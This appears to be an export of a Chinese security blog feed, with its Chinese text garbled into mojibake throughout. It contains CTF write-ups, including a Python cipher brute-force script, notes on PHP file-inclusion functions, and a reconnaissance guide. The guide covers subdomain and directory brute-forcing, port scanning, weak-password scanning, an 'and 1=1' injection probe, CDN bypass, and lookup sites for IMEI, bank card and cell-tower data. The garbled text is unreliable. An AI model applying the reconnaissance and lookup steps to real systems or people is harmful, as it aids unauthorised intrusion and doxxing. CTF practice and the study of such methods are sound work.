src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3664011646.png"></p><p>èœé¸¡çš„æˆ‘å†™ä¸æ¥è„šæœ¬ï¼Œåªèƒ½ç”¨ç”»å›¾å·¥å…·æ¥ç”»,æ£’æ£’ç³–çš„æ–¹å—ç”»é»‘è‰²çš„,ç„¶ååé€‰ç™½è‰²çš„ï¼Œå¾—åˆ°äºŒç»´ç </p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3935891707.png"></p><p>æœ€åæ‰«ä¸€ä¸‹ï¼Œmd5ä¸€è½¬å°±Oäº†</p><p>é™„ä¸Šå¤§ä½¬åšæ³•ï¼š<br>è‚‰çœ¼+pil<br><a href="https://pan.baidu.com/s/1Gol74pJe1YwifiqSzzhswg"><strong>è„šæœ¬</strong></a>ï¼ˆæå–ç ï¼šaei4ï¼‰<br>åŒæ ·å¾—åˆ°äºŒç»´ç ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1404278893.png"></p><h2 id="é—®å·"><a href="#é—®å·" class="headerlink" title="é—®å·"></a>é—®å·</h2><p>å¡«å®Œå³å¯æ‹¿åˆ°flagäº†</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="bbcrypto"><a href="#bbcrypto" class="headerlink" title="bbcrypto"></a>bbcrypto</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1876243242.png"></p><p><a href="https://pan.baidu.com/s/1095-ts7p7N2d1wxuWjUBmg"><strong>é™„ä»¶</strong></a>ï¼ˆæå–ç ï¼šobksï¼‰</p><p>å¾ˆæ˜æ˜¾è¿™é¢˜å†™ä¸ªåæ¨è„šæœ¬ï¼Œä¸€æŠŠæ¢­å“ˆ</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2150119991.png"></p><p>é™„ä¸Šè„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">flag = <span class="string">&quot;flag&quot;</span></span><br><span class="line">_flag = <span class="string">&quot;177401504b0125272c122743171e2c250a602e3a7c206e014a012703273a3c0160173a73753d&quot;</span></span><br><span class="line">A = <span class="number">57</span></span><br><span class="line">SALT = <span class="string">&quot;ahh&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">m, a, si</span>):</span></span><br><span class="line">  c = <span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(m), <span class="number">2</span>):</span><br><span class="line">     s = m[i]+m[i+<span class="number">1</span>]</span><br><span class="line">     p = <span class="built_in">ord</span>(<span class="built_in">next</span>(si))</span><br><span class="line">     <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hex</span>(((j) * a + p) % <span class="number">128</span>)[<span class="number">2</span>:].zfill(<span class="number">2</span>) == s:</span><br><span class="line">            c += <span class="built_in">chr</span>(j)</span><br><span class="line">            print(c)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">  print(c)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">m, a, si</span>):</span></span><br><span class="line">  c=<span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m)):</span><br><span class="line">    c+=<span class="built_in">hex</span>(((<span class="built_in">ord</span>(m[i])) * a + <span class="built_in">ord</span>(<span class="built_in">next</span>(si))) % <span class="number">128</span>)[<span class="number">2</span>:].zfill(<span class="number">2</span>) <span class="comment">#å–16è¿›åˆ¶</span></span><br><span class="line">  <span class="keyword">return</span> c</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">boom</span>():</span></span><br><span class="line">  a = A</span><br><span class="line">  salt = SALT</span><br><span class="line">  si = cycle(salt.lower())</span><br><span class="line">  i = <span class="number">1</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">    a = i</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        salt = <span class="built_in">list</span>(salt) <span class="comment">#97-122</span></span><br><span class="line">        salt[<span class="number">2</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(salt[<span class="number">2</span>]) + <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(salt[<span class="number">2</span>]) &gt; <span class="number">122</span>:</span><br><span class="line">            salt[<span class="number">2</span>] = <span class="string">&#x27;a&#x27;</span></span><br><span class="line">            salt[<span class="number">1</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(salt[<span class="number">1</span>]) + <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(salt[<span class="number">1</span>]) &gt; <span class="number">122</span>:</span><br><span class="line">            salt[<span class="number">1</span>] = <span class="string">&#x27;a&#x27;</span></span><br><span class="line">            salt[<span class="number">0</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(salt[<span class="number">0</span>]) + <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(salt[<span class="number">0</span>]) &gt; <span class="number">122</span>:</span><br><span class="line">            a += <span class="number">1</span></span><br><span class="line">            salt[<span class="number">0</span>] = <span class="string">&#x27;a&#x27;</span></span><br><span class="line">        salt = <span class="string">&quot;&quot;</span>.join(salt)</span><br><span class="line">        si = cycle(salt.lower())</span><br><span class="line">        c=encrypt(flag, a, si)</span><br><span class="line">        print(c[:<span class="number">8</span>] + <span class="string">&quot;--&gt;&quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        print(<span class="built_in">str</span>(a) + <span class="string">&quot; &quot;</span>+ salt)</span><br><span class="line">        <span class="keyword">if</span> c[:<span class="number">8</span>] == <span class="string">&#x27;17740150&#x27;</span>:</span><br><span class="line">            os.system(<span class="string">&quot;pause&quot;</span>)</span><br><span class="line">a = A</span><br><span class="line">salt = SALT</span><br><span class="line">si = cycle(salt.lower())</span><br><span class="line">decrypt(_flag, a , si)</span><br></pre></td></tr></table></figure><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="å¸®å¸®å°çº¢èŠ±"><a href="#å¸®å¸®å°çº¢èŠ±" class="headerlink" title="å¸®å¸®å°çº¢èŠ±"></a>å¸®å¸®å°çº¢èŠ±</h2><p>å‡‘å·§èµ¶ä¸Šäº†å¤§ä½¬çš„è½¦æ‹¿åˆ°äº†flagï¼Œæ”¹åŠ¨ä¹‹åå°±ä¸ä¼šäº†â€¦<br>èº«ä¸ºä¸€åwebæ‰‹ï¼Œç»“æœä¸€é“webé¢˜éƒ½åšä¸å‡ºæ¥~</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DASCTF </tag>
            
            <tag> BJDCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¿¡æ¯æœé›†</title>
      <link href="2020/05/22/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
      <url>2020/05/22/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<p>1.åŸŸåä¿¡æ¯ï¼š<br>a,é€šè¿‡åŸŸåè·å–å¯¹åº”çš„IPï¼Œç„¶åé€šè¿‡pingçœ‹ä¸€ä¸‹è¿™ä¸ªIPè¿™å°æœåŠ¡å™¨TTLè¿”å›çš„æ—¶é—´è¿”å›å€¼  åˆæ­¥çš„åˆ¤æ–­è¿™ä¸ªç”¨çš„æ˜¯ä»€ä¹ˆæœåŠ¡å™¨ä»€ä¹ˆç‰ˆæœ¬ï¼Œè¿˜å¯ä»¥è¾“å…¥ns lookup+åŸŸåæ¥æŸ¥çœ‹è¿™ä¸ªåŸŸåå¯¹åº”çš„IPåœ°å€<br>b.æ”¶é›†å­åŸŸå<br>(1).site+åŸŸå<br>(2).ä½¿ç”¨å·¥å…·layerå­åŸŸåæŒ–æ˜æœº4.2<br>(3).ä½¿ç”¨å·¥å…·subDomainsBrute<br>å­åŸŸåè¾ƒå¥½æ‰¾æ¼æ´<br>c.whoisï¼ˆæ³¨å†Œäººï¼‰ä¿¡æ¯æŸ¥è¯¢ï¼š<br>(1).æ ¹æ®å·²çŸ¥åŸŸååæŸ¥ï¼Œåˆ†æå‡ºæ­¤åŸŸåçš„æ³¨å†Œäººã€é‚®ç®±ã€ç”µè¯ç­‰<br>(2).å·¥å…·ï¼šçˆ±ç«™ç½‘ã€ç«™é•¿å·¥å…·ã€å¾®æ­¥åœ¨çº¿(<a href="http://x.threatbook.cn/">http://x.threatbook.cn</a>)<br>(3).site.ip138.comã€searchdns.netcraft.com<br>2.æ•æ„Ÿç›®å½•ï¼š<br>a.æ”¶é›†æ–¹å‘ï¼šrobots.txtã€åå°ç›®å½•ã€å®‰è£…åŒ…ã€ä¸Šä¼ ç›®å½•ã€MySQLç®¡ç†æ¥å£ã€å®‰è£…é¡µé¢ã€ phpinfoã€ç¼–è¾‘å™¨ã€IISçŸ­æ–‡ä»¶<br>b.å¸¸ç”¨å·¥å…·ï¼š<br>å­—å…¸çˆ†ç ´&gt;&gt;å¾¡å‰‘ã€dirbusterã€wwwscanã€iis_shortname_scanner<br>èœ˜è››çˆ¬è¡Œ&gt;&gt;çˆ¬è¡Œèœåˆ€ã€webrobotã€burp<br>3.ç«¯å£æ‰«æï¼š<br>21&gt;&gt;ftp 22&gt;&gt;ssh 23&gt;&gt;telnet 110&gt;&gt;pop3 1433&gt;&gt;sqlsever 3306&gt;&gt;mysqlâ€¦.<br>3389&gt;&gt;mstssc 8080&gt;&gt;tomcat/jboss 9090&gt;&gt;websphereç­‰ç­‰<br>å¸¸ç”¨å·¥å…·ï¼šnmapã€ScanPort(å¯æŸ¥çœ‹å¼€æ”¾çš„ç«¯å£)ã€ntscan(å¼±å£ä»¤)ã€telnet(æ‰‹å·¥)<br>4.æ—ç«™Cæ®µ<br>æ—ç«™ï¼šåŒæœåŠ¡å™¨å…¶å®ƒç«™ç‚¹<br>Cæ®µï¼šåŒä¸€ç½‘æ®µå…¶ä»–æœåŠ¡å™¨<br>å¸¸ç”¨å·¥å…·ï¼šweb&gt;&gt;k8æ—ç«™ã€å¾¡å‰‘1.5 (<a href="http://www.5kik.com/c/">http://www.5kik.com/c/</a>)<br>ç«¯å£&gt;&gt;PortScan ( <a href="https://www.webscan.cc/">https://www.webscan.cc/</a>)<br>5.æ•´ç«™åˆ†æ<br>æœåŠ¡å™¨ç±»å‹ï¼šæœåŠ¡å™¨å¹³å°ã€ç‰ˆæœ¬ç­‰ LinuxåŒºåˆ†å¤§å°å†™(egï¼šè¾“å…¥phPçœ‹ä»–æ˜¯å¦è¿”å›PHP)<br>ç½‘ç«™å®¹å™¨ï¼šæ­å»ºç½‘ç«™çš„æœåŠ¡ç»„ä»¶ï¼ˆegï¼šiisã€apacheã€nginxã€tomcatç­‰ï¼‰ï¼ˆæŠ“ä¸ªåŒ…çœ‹å“åº”åŒ…/æŠ¥é”™ï¼‰<br>è„šæœ¬ç±»å‹ï¼šASPã€PHPã€JSPï¼ˆå½©ç¥¨ç«™ç‚¹ï¼‰ã€aspxç­‰<br>æ•°æ®åº“ç±»å‹ï¼šaccessã€sqlserverã€mysqlã€oracleã€postgresqlã€db2ã€sqlistç­‰<br>åœ¨ID=æ•°å­— è¿™åé¢åŠ and1=1<br>CMSç±»å‹ï¼šdedecmsã€diguoã€meterinfoã€dz ï¼ˆé€šè¿‡readme.txtçœ‹å®‰è£…ä¿¡æ¯ï¼‰<br>WAFï¼ˆwebåº”ç”¨é˜²æŠ¤ç³»ç»Ÿ/ç½‘ç«™åº”ç”¨çº§å…¥ä¾µé˜²å¾¡ç³»ç»Ÿï¼‰(Web Application Firewall)<br>site: ï¼šæŒ‡å®šç«™ç‚¹<br>7.URLé‡‡é›†<br>8.åå°æŸ¥æ‰¾<br>9.CDNç»•è¿‡æ–¹æ³•<br>CDNæ˜¯æ„å»ºåœ¨ç°æœ‰ç½‘ç»œåŸºç¡€ä¹‹ä¸Šçš„æ™ºèƒ½è™šæ‹Ÿç½‘ç»œï¼Œä¾é éƒ¨ç½²åœ¨å„åœ°çš„è¾¹ç¼˜æœåŠ¡å™¨ï¼Œé€šè¿‡ä¸­å¿ƒå¹³å°çš„è´Ÿè½½å‡è¡¡ã€å†…å®¹åˆ†å‘ã€è°ƒåº¦ç­‰åŠŸèƒ½æ¨¡å—ï¼Œä½¿ç”¨æˆ·å°±è¿‘è·å–æ‰€éœ€å†…å®¹ï¼Œé™ä½ç½‘ç»œæ‹¥å¡ï¼Œæé«˜ç”¨æˆ·è®¿é—®å“åº”é€Ÿåº¦å’Œå‘½ä¸­ç‡ã€‚CDNçš„å…³é”®æŠ€æœ¯ä¸»è¦æœ‰å†…å®¹å­˜å‚¨å’Œåˆ†å‘æŠ€æœ¯ã€‚<br><a href="http://www.ip138.com/">http://www.ip138.com/</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"> ç¤¾å·¥æŸ¥è¯¢ç½‘ç«™</span><br><span class="line">â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”</span><br><span class="line">shodanÂ Â Â Â Â  https:&#x2F;&#x2F;www.shodan.io&#x2F;</span><br><span class="line"></span><br><span class="line">zoomeyeÂ Â  https:&#x2F;&#x2F;www.zoomeye.org&#x2F;</span><br><span class="line"></span><br><span class="line">censysÂ  Â  Â  https:&#x2F;&#x2F;censys.io&#x2F;</span><br><span class="line"></span><br><span class="line">piplÂ  Â  Â  Â  Â  Â Â https:&#x2F;&#x2F;pipl.com&#x2F;</span><br><span class="line"></span><br><span class="line">reg007Â Â Â Â Â  https:&#x2F;&#x2F;www.reg007.com&#x2F;</span><br><span class="line"></span><br><span class="line">whoisÂ Â Â Â Â Â Â  https:&#x2F;&#x2F;www.whois.com&#x2F;</span><br><span class="line"></span><br><span class="line">dogpileÂ  Â  Â https:&#x2F;&#x2F;www.dogpile.com&#x2F;</span><br><span class="line"></span><br><span class="line">YandexÂ  Â  Â https:&#x2F;&#x2F;yandex.com&#x2F;</span><br><span class="line"></span><br><span class="line">å¯ä¿¡å® Â  Â  Â  https:&#x2F;&#x2F;www.qixin.com&#x2F;?from&#x3D;baidusem24</span><br><span class="line"></span><br><span class="line">å¤©çœ¼æŸ¥Â Â Â Â Â Â  https:&#x2F;&#x2F;www.tianyancha.com&#x2F;</span><br><span class="line"></span><br><span class="line">çˆ±æŸ¥Â Â Â Â Â Â Â Â Â  http:&#x2F;&#x2F;www.2cha.com&#x2F;</span><br><span class="line"></span><br><span class="line">IMEIdbÂ  Â  Â  http:&#x2F;&#x2F;www.imeidb.com&#x2F;</span><br><span class="line"></span><br><span class="line">åŸºç«™å®šä½ Â Â  http:&#x2F;&#x2F;www.cellid.cn&#x2F;</span><br><span class="line"></span><br><span class="line">é“¶è¡Œå¡å·å½’å±åœ°Â Â Â Â  http:&#x2F;&#x2F;cha.yinhangkadata.com&#x2F;</span><br><span class="line"></span><br><span class="line">å‹å•†å‘ç¥¨æŸ¥è¯¢Â Â Â  Â  Â  http:&#x2F;&#x2F;fapiao.youshang.com&#x2F;</span><br><span class="line">â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä¿¡æ¯æœé›† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>miniLCTF 2020</title>
      <link href="2020/05/17/2020minilCTF/"/>
      <url>2020/05/17/2020minilCTF/</url>
      
        <content type="html"><![CDATA[<h1 id="Misc-MiniGameHacking"><a href="#Misc-MiniGameHacking" class="headerlink" title="Misc-MiniGameHacking"></a>Misc-MiniGameHacking</h1><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2650491112.png"></p><p><a href="https://github.com/SMU-harvey/Harvey"><strong>é™„ä»¶</strong></a></p><p>è§£é¢˜æ€è·¯ï¼š<br>çœ‹å‡½æ•°å,ç»“åˆæ¸¸æˆ,è‚¯å®šæ˜¯è¦é€šå…³æ‰èƒ½æ‹¿flag,ç„¶åå°±æƒ³æ³•æ”¹bossè¡€æˆ–è€…æ”¹bossä¸èƒ½æ”»å‡»<br>è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨åç¼–è¯‘å·¥å…·dnspyæ‰“å¼€dllæ–‡ä»¶</p><h4 id="dnspyï¼ˆæå–ç ï¼šd0vlï¼‰"><a href="#dnspyï¼ˆæå–ç ï¼šd0vlï¼‰" class="headerlink" title="dnspyï¼ˆæå–ç ï¼šd0vlï¼‰"></a><a href="https://pan.baidu.com/s/1DEtisrXFC8dvqegzGnM5sg"><strong>dnspy</strong></a>ï¼ˆæå–ç ï¼šd0vlï¼‰</h4><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/441053936.png"></p><p>ç„¶åæ”¹è¿™ä¸ªFullå‡½æ•°ï¼ˆbossçš„è¡€ï¼‰ï¼Œå¦‚ä¸‹ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2122847656.png"></p><p>ä¿å­˜ä¹‹åæ‰“å¼€æ¸¸æˆï¼Œåªéœ€æŒ‰ä½zé”®ç«™æ’¸bossï¼Œæ‰“å®Œ14å…³å³å¯</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1130642187.png"></p><blockquote><p>ä¸è¿‡çœŸæ­£çš„å‹‡å£«éƒ½æ˜¯ç›´æ¥è¿è¿‡åå››å…³</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> miniLCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¼ªåè®®</title>
      <link href="2020/05/15/%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
      <url>2020/05/15/%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<blockquote><p>åŸæ–‡ï¼š<a href="https://www.cnblogs.com/cmt/p/14553189.html">https://www.cnblogs.com/cmt/p/14553189.html</a></p></blockquote><h2 id="ä¸€ã€ä¼ªåè®®ç§ç±»"><a href="#ä¸€ã€ä¼ªåè®®ç§ç±»" class="headerlink" title="ä¸€ã€ä¼ªåè®®ç§ç±»"></a>ä¸€ã€ä¼ªåè®®ç§ç±»</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">file:&#x2F;&#x2F; è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ</span><br><span class="line">http:&#x2F;&#x2F; è®¿é—®http(sï¼‰ç½‘å€</span><br><span class="line">ftp:&#x2F;&#x2F; è®¿é—®ftp</span><br><span class="line">php:&#x2F;&#x2F; è®¿é—®å„ä¸ªè¾“å…¥&#x2F;è¾“å‡ºæµ</span><br><span class="line">zlib:&#x2F;&#x2F; å‹ç¼©æµ</span><br><span class="line">data:&#x2F;&#x2F; æ•°æ®</span><br><span class="line">rar:&#x2F;&#x2F; RARå‹ç¼©åŒ…</span><br><span class="line">ogg:&#x2F;&#x2F; éŸ³é¢‘æµ</span><br></pre></td></tr></table></figure><h2 id="äºŒã€é€ æˆæ–‡ä»¶åŒ…å«æ¼æ´çš„å‡½æ•°"><a href="#äºŒã€é€ æˆæ–‡ä»¶åŒ…å«æ¼æ´çš„å‡½æ•°" class="headerlink" title="äºŒã€é€ æˆæ–‡ä»¶åŒ…å«æ¼æ´çš„å‡½æ•°"></a>äºŒã€é€ æˆæ–‡ä»¶åŒ…å«æ¼æ´çš„å‡½æ•°</h2><p>includeã€requireã€include_onceã€require_onceã€highlight_fileã€show_sourceã€file_get_contentsã€fopenã€fileã€readline</p><h4 id="1-includeå‡½æ•°"><a href="#1-includeå‡½æ•°" class="headerlink" title="1.includeå‡½æ•°"></a>1.includeå‡½æ•°</h4><p>å¯ä»¥æ”¾åœ¨PHPè„šæœ¬çš„ä»»æ„ä½ç½®ï¼Œä¸€èˆ¬æ”¾åœ¨æµç¨‹æ§åˆ¶çš„å¤„ç†éƒ¨åˆ†ä¸­ã€‚å½“PHPè„šæœ¬æ‰§è¡Œåˆ°includeæŒ‡å®šå¼•å…¥çš„æ–‡ä»¶æ—¶ï¼Œæ‰å°†å®ƒåŒ…å«å¹¶å°è¯•æ‰§è¡Œã€‚è¿™ç§æ–¹å¼å¯ä»¥æŠŠç¨‹åºæ‰§è¡Œæ—¶çš„æµç¨‹è¿›è¡Œç®€å•åŒ–ã€‚å½“ç¬¬äºŒæ¬¡é‡åˆ°ç›¸åŒæ–‡ä»¶æ—¶ï¼ŒPHPè¿˜æ˜¯ä¼šé‡æ–°è§£é‡Šä¸€æ¬¡ï¼Œincludeç›¸å¯¹äºrequireçš„æ‰§è¡Œæ•ˆç‡ä¸‹é™å¾ˆå¤šï¼ŒåŒæ—¶åœ¨å¼•å…¥æ–‡ä»¶ä¸­åŒ…å«ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°æ—¶ï¼ŒPHPåœ¨è§£é‡Šè¿‡ç¨‹ä¸­ä¼šå‘ç”Ÿå‡½æ•°é‡å¤å®šä¹‰é—®é¢˜ã€‚includeè½½å…¥æˆåŠŸåï¼Œè¿”å›1ï¼Œå¤±è´¥åˆ™è¿”å›falseã€‚</p><h4 id="2-requireå‡½æ•°"><a href="#2-requireå‡½æ•°" class="headerlink" title="2.requireå‡½æ•°"></a>2.requireå‡½æ•°</h4><p>requireå‡½æ•°ä¸€èˆ¬æ”¾åœ¨PHPè„šæœ¬çš„æœ€å‰é¢ï¼ŒPHPæ‰§è¡Œå‰å°±ä¼šå…ˆè¯»å…¥requireæŒ‡å®šå¼•å…¥çš„æ–‡ä»¶ï¼ŒåŒ…å«å¹¶å°è¯•æ‰§è¡Œå¼•å…¥çš„è„šæœ¬æ–‡ä»¶ã€‚requireçš„å·¥ä½œæ–¹å¼æ˜¯æé«˜PHPçš„æ‰§è¡Œæ•ˆç‡ï¼Œå½“å®ƒåœ¨åŒä¸€ä¸ªç½‘é¡µä¸­è§£é‡Šè¿‡ä¸€æ¬¡åï¼Œç¬¬äºŒæ¬¡ä¾¿ä¸ä¼šè§£é‡Šã€‚ä½†åŒæ ·çš„ï¼Œæ­£å› ä¸ºå®ƒä¸ä¼šé‡å¤è§£é‡Šå¼•å…¥æ–‡ä»¶ï¼Œæ‰€ä»¥å½“PHPä¸­ä½¿ç”¨å¾ªç¯æˆ–æ¡ä»¶è¯­å¥æ¥å¼•å…¥æ–‡ä»¶æ—¶ï¼Œéœ€è¦ç”¨åˆ°includeã€‚requireè½½å…¥æˆåŠŸè¿”å›1ï¼Œå¤±è´¥æ— è¿”å›å€¼ã€‚</p><h4 id="3-include-onceå’Œrequire-onceå‡½æ•°"><a href="#3-include-onceå’Œrequire-onceå‡½æ•°" class="headerlink" title="3.include_onceå’Œrequire_onceå‡½æ•°"></a>3.include_onceå’Œrequire_onceå‡½æ•°</h4><p>åˆ†åˆ«ä¸require / includeä½œç”¨ç›¸åŒï¼Œä¸åŒçš„æ˜¯ä»–ä»¬åœ¨æ‰§è¡Œåˆ°æ—¶ä¼šå…ˆæ£€æŸ¥ç›®æ ‡å†…å®¹æ˜¯ä¸æ˜¯åœ¨ä¹‹å‰å·²ç»å¯¼å…¥è¿‡ï¼Œå¦‚æœå¯¼å…¥è¿‡äº†ï¼Œé‚£ä¹ˆä¾¿ä¸ä¼šå†æ¬¡é‡å¤å¼•å…¥å…¶åŒæ ·çš„å†…å®¹ã€‚</p><h4 id="4-highlight-fileå‡½æ•°"><a href="#4-highlight-fileå‡½æ•°" class="headerlink" title="4.highlight_fileå‡½æ•°"></a>4.highlight_fileå‡½æ•°</h4><p>highlight_file() å‡½æ•°å¯¹æ–‡ä»¶è¿›è¡Œè¯­æ³•é«˜äº®æ˜¾ç¤ºã€‚<br>è¯­æ³•ï¼šhighlight_file(filename,return) â€”â€” filenameï¼šå¿…éœ€ã€‚è¦è¿›è¡Œé«˜äº®å¤„ç†çš„ PHP æ–‡ä»¶çš„è·¯å¾„ã€‚returnï¼šå¯é€‰ã€‚å¦‚æœè®¾ç½® trueï¼Œåˆ™æœ¬å‡½æ•°è¿”å›é«˜äº®å¤„ç†çš„ä»£ç ã€‚<br>è¯¥å‡½æ•°é€šè¿‡ä½¿ç”¨ PHP è¯­æ³•é«˜äº®ç¨‹åºä¸­å®šä¹‰çš„é¢œè‰²ï¼Œè¾“å‡ºæˆ–è¿”å›åŒ…å«åœ¨ filename ä¸­çš„ä»£ç çš„è¯­æ³•é«˜äº®ç‰ˆæœ¬ã€‚å¦‚æœ return å‚æ•°è¢«è®¾ç½®ä¸º trueï¼Œé‚£ä¹ˆè¯¥å‡½æ•°ä¼šè¿”å›è¢«é«˜äº®å¤„ç†çš„ä»£ç ï¼Œè€Œä¸æ˜¯è¾“å‡ºå®ƒä»¬ã€‚å¦åˆ™ï¼Œè‹¥æˆåŠŸï¼Œåˆ™è¿”å› trueï¼Œå¤±è´¥åˆ™è¿”å› falseã€‚è®¸å¤šæœåŠ¡å™¨è¢«é…ç½®ä¸ºå¯¹å¸¦æœ‰ phps åç¼€çš„æ–‡ä»¶è¿›è¡Œè‡ªåŠ¨é«˜äº®å¤„ç†ã€‚ä¾‹å¦‚ï¼Œåœ¨æŸ¥çœ‹ example.phps æ—¶ï¼Œå°†æ˜¾ç¤ºè¯¥æ–‡ä»¶è¢«è¯­æ³•é«˜äº®æ˜¾ç¤ºçš„æºä»£ç ã€‚è¦å¯ç”¨è¯¥åŠŸèƒ½ï¼Œè¯·æŠŠAddType application/x-httpd-php-source .phpsæ·»åŠ åˆ° httpd.confã€‚</p><h4 id="5-show-sourceå‡½æ•°"><a href="#5-show-sourceå‡½æ•°" class="headerlink" title="5.show_sourceå‡½æ•°"></a>5.show_sourceå‡½æ•°</h4><p>è¯¥å‡½æ•°æ˜¯highlight_fileå‡½æ•°çš„åˆ«åã€‚</p><h4 id="6-file-get-contentså‡½æ•°"><a href="#6-file-get-contentså‡½æ•°" class="headerlink" title="6.file_get_contentså‡½æ•°"></a>6.file_get_contentså‡½æ•°</h4><p>file_get_contents() å‡½æ•°æŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ã€‚å’Œ file() ä¸€æ ·ï¼Œä¸åŒçš„æ˜¯ file_get_contents() æŠŠæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚file_get_contents() å‡½æ•°æ˜¯ç”¨äºå°†æ–‡ä»¶çš„å†…å®¹è¯»å…¥åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­çš„é¦–é€‰æ–¹æ³•ã€‚å¦‚æœæ“ä½œç³»ç»Ÿæ”¯æŒï¼Œè¿˜ä¼šä½¿ç”¨å†…å­˜æ˜ 